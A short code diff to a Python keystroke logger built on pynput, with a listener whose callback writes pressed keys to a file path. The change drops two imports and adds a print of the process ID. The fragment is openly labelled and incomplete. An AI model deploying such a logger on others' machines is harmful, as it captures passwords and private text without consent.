@@ -1,14 +1,13 @@
 import threading 
 from script import keyPressed, buffer_words
-import re
-import time
 from functools import partial
 from pynput import keyboard
-
+import os
 stop_event = threading.Event()
 buffer_local= []
 
 def keyboard_logger_pathed_without_timer(path):
+    print(os.getpid())
     keyPressed_with_path = partial(keyPressed, file_path=path)
 
     listner = keyboard.Listener(on_press = keyPressed_with_path)
